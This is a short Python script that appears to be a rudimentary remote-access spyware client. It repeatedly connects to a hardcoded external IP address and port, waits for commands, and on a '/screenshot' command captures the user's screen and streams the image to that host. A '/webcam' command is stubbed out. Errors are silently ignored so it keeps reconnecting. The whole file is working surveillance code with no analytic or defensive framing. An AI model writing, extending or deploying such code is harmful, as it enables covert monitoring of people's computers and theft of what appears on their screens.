from socket import *
import sys
import pyautogui

host = '13.49.67.221'
port = 6522
addr = (host,port)
while True:
	try:
		tcp_socket = socket(AF_INET, SOCK_STREAM)
		tcp_socket.connect(addr)
		data = "Connected"
		if not data : 
		    tcp_socket.close() 
		    sys.exit(1)

		data = str.encode(data)
		tcp_socket.send(data)
		data = bytes.decode(data)
		data = tcp_socket.recv(1024)
		data = data.decode()
		if data == "/screenshot":
			scr = pyautogui.screenshot()
			scr.save('screen.png')
			screen = open("screen.png", "rb")
			image_data = screen.read(2048)
			while image_data:
				tcp_socket.send(image_data)
				image_data = screen.read(2048)
		elif data == "/webcam":
			print("----webcam")
		tcp_socket.close()
	except:
		pass